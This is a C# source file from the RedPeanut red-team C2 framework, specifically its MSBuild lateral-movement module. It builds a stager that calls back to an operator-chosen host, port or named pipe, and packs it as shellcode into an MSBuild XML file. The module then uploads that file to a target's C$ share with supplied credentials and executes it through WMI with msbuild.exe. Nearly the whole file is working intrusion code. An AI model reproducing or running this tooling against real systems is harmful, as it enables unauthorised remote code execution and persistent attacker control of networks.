//
// Author: B4rtik (@b4rtik)
// Project: RedPeanut (https://github.com/b4rtik/RedPeanut)
// License: BSD 3-Clause
//

using System;
using System.Collections.Generic;
using static RedPeanut.Utility;
using System.IO;
using System.Text;
using static RedPeanut.Models;
using Newtonsoft.Json;

namespace RedPeanut
{
    public class LateralMSBuildManager : IMenu
    {
        public static Dictionary<string, string> mainmenu = new Dictionary<string, string>
        {
            { "set targethost", "Set target host" },
            { "set lhost", "Set username" },
            { "set lport", "Set password" },
            { "set lpipename", "Set lpipename" },
            { "set taskname", "Set taskname" },
            { "set domain", "Set domain" },
            { "set username", "Set username" },
            { "set password", "Set password" },
            { "set profile", "Set profile" },
            { "run", "Execute module" },
            { "options", "Print current config" },
            { "info", "Print help" },
            { "back", "Back to lateral menu" }
        };

        public void RePrintCLI()
        {
            Utility.RePrintCLI(agent, modulename);
            return;
        }

        IAgentInstance agent = null;
        string modulename = "lateralmsbuild";
        string targethost = null;
        string lhost = null;
        int lport = 0;
        int profile = 0;
        string username = null;
        string password = null;
        string domain = null;
        string taskname = null;
        string lpipename = null;
        
        bool exit = false;

        public LateralMSBuildManager()
        {

        }

        public LateralMSBuildManager(IAgentInstance agent)
        {
            this.agent = agent;
        }

        public void Execute()
        {
            exit = false;
            string input;
            SetAutoCompletionHandler(mainmenu);
            do
            {
                input = RedPeanutCLI(agent, modulename);
                LauncherMenu(input);
            } while (!exit);
        }

        private void LauncherMenu(string input)
        {
            string f_input = ParseSelection(input);

            if (!string.IsNullOrEmpty(input))
            {
                if (mainmenu.ContainsKey(f_input.TrimEnd()))
                {
                    switch (f_input.TrimEnd())
                    {
                        case "set targethost":
                            targethost = GetParsedSetString(input);
                            break;
                        case "set username":
                            username = GetParsedSetString(input);
                            break;
                        case "set password":
                            password = GetParsedSetString(input);
                            break;
                        case "set domain":
                            domain = GetParsedSetString(input);
                            break;
                        case "set lhost":
                            lhost = GetParsedSetString(input);
                            break;
                        case "set lport":
                            lport = GetParsedSetInt(input);
                            break;
                        case "set lpipename":
                            lpipename = GetParsedSetString(input);
                            break;
                        case "set taskname":
                            taskname = GetParsedSetString(input);
                            break;
                        case "set profile":
                            profile = GetParsedSetInt(input);
                            break;
                        case "run":
                            Run();
                            break;
                        case "options":
                            PrintCurrentConfig();
                            break;
                        case "info":
                            PrintOptions("info", mainmenu);
                            break;
                        case "back":
                            Program.GetMenuStack().Pop();
                            exit = true;
                            return;
                        default:
                            Console.WriteLine("We had a woodoo");
                            break;
                    }
                }
                else
                {
                    PrintOptions("Command not found", mainmenu);
                }
            }
        }


        private void Run()
        {
            try
            {
                if (string.IsNullOrEmpty(username) || string.IsNullOrEmpty(password) || string.IsNullOrEmpty(lhost) || (string.IsNullOrEmpty(lpipename) && lport < 1) || profile < 1)
                {
                    return;
                }
                else
                {
                    // Parse .cs sorce and repalce variable
                    string folderrpath = Path.Combine(Directory.GetCurrentDirectory(), WORKSPACE_FOLDER, TEMPLATE_FOLDER);
                    if (Program.GetC2Manager().GetC2Server().GetProfiles().ContainsKey(profile))
                    {
                        string domainname = ".";
                        if (!string.IsNullOrEmpty(domain))
                            domainname = domain;

                        string source = File.ReadAllText(Path.Combine(folderrpath, STAGER_TEMPLATE));

                        if (lpipename == null)
                        {
                            //Http no pivot stager
                            ListenerConfig conf = new ListenerConfig("", lhost, lport, Program.GetC2Manager().GetC2Server().GetProfile(profile), profile);
                            source = Replacer.ReplaceAgentProfile(source, RedPeanut.Program.GetServerKey(),40, conf);
                        }
                        else
                        {
                            //NamedPipe enable stager
                            ListenerPivotConfig conf = new ListenerPivotConfig("", lhost, lpipename, Program.GetC2Manager().GetC2Server().GetProfile(profile));
                            source = Replacer.ReplaceAgentProfile(source, RedPeanut.Program.GetServerKey(),40, conf);
                        }

                        string stagerstr = Convert.ToBase64String(CompressGZipAssembly(Builder.BuidStreamAssembly(source, RandomAString(10, new Random()) + ".dll",40)));

                        //Create TaskMsg gzip
                        if (agent != null)
                        {
                             

                            
                            source = File.ReadAllText(Path.Combine(folderrpath, SPAWNER_TEMPLATE))
                            .Replace("#NUTCLR#", Convert.ToBase64String(CompressGZipAssembly(Builder.GenerateShellcode(stagerstr, RandomString(10, new Random()) + ".exe", "RedPeanutRP", "Main", new string[] { "" }))))
                            .Replace("#SPAWN#", Program.GetC2Manager().GetC2Server().GetProfile(profile).Spawn)
                            .Replace("#USERNAME#", username)
                            .Replace("#PASSWORD#", password)
                            .Replace("#DOMAIN#", domain);

                            string spawner = Convert.ToBase64String(CompressGZipAssembly(Builder.BuidStreamAssembly(source, RandomAString(10, new Random()) + ".dll",40)));

                            Dictionary<string, string> msbuildargs = new Dictionary<string, string>();
                            msbuildargs.Add("#{taskname}", taskname);

                            MSBuildGenerator gen = new MSBuildGenerator(spawner, msbuildargs);

                            string pathdest = string.Format(@"\\{0}\C$\Windows\temp", targethost);
                            string filename = RandomAString(10, new Random()).ToLower() + ".xml";
                            string filesrc = Convert.ToBase64String(CompressGZipAssembly(Encoding.Default.GetBytes(gen.GetScriptText())));

                            string destinattionfull = pathdest.TrimEnd('\\') + @"\" + filename;

                            string destinationpath = ".";
                            if (!string.IsNullOrEmpty(pathdest))
                                destinationpath = pathdest.Replace("\\", "\\\\");

                            string destinationfilename = "";
                            if (!string.IsNullOrEmpty(filename))
                                destinationfilename = filename;

                            // Parse .cs sorce and repalce variable
                            source = File.ReadAllText(Path.Combine(folderrpath, FILEUPLOAD_TEMPLATE));
                            source = Replacer.ReplaceFileUpLoad(source, filesrc, destinationpath, destinationfilename, username, password, domainname);

                            string assembly = Convert.ToBase64String(CompressGZipAssembly(Builder.BuidStreamAssembly(source, "FileUpLoader.dll",40)));

                            //Task agent to copy file to target host
                            RunAssemblyBase64(assembly, "FileUpLoader", new string[] { "pippo" }, agent);

                            //Run msbuld via wmi
                            List<string> args = new List<string>();
                            args.Add("action=create");
                            args.Add("computername=" + targethost);
                            args.Add("username=" + domain + "\\" + username);
                            args.Add("password=" + password);
                            args.Add("command=C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\msbuild.exe C:\\Windows\\temp\\" + destinationfilename);

                            string s = "";
                            foreach (string ss in args.ToArray())
                                s += ss;
                            Console.WriteLine("String command: " + s);
                            RunAssembly(PL_MODULE_SHARPWMI, "SharpWMI.Program", args.ToArray(), agent);

                        }
                    }
                }
            } catch (Exception e)
            {
                Console.WriteLine("[*] Error running task build {0}", e.Message);
            }              
        }

        private void PrintCurrentConfig()
        {
            Console.WriteLine("{0}", modulename);
            Console.WriteLine();
            Console.WriteLine("{0}: {1}", "targethost", targethost);
            Console.WriteLine("{0}: {1}", "lhost", lhost);
            Console.WriteLine("{0}: {1}", "lport", lport);
            Console.WriteLine("{0}: {1}", "lpipename", lpipename);
            Console.WriteLine("{0}: {1}", "taskname", taskname);
            Console.WriteLine("{0}: {1}", "domain", domain);
            Console.WriteLine("{0}: {1}", "username", username);
            Console.WriteLine("{0}: {1}", "password", password);
            Console.WriteLine("{0}: {1}", "profile", profile);

            Dictionary<string, string> properties = new Dictionary<string, string>
            {
                { "targethost", targethost },
                { "lhost", lhost },
                { "lport", lport.ToString() },
                { "lpipename", lpipename },
                { "taskname", taskname },
                { "domain", domain },
                { "username", username },
                { "password", password },
                { "profile", profile.ToString() }
            };

            Utility.PrintCurrentConfig(modulename, properties);
        }
    }
}
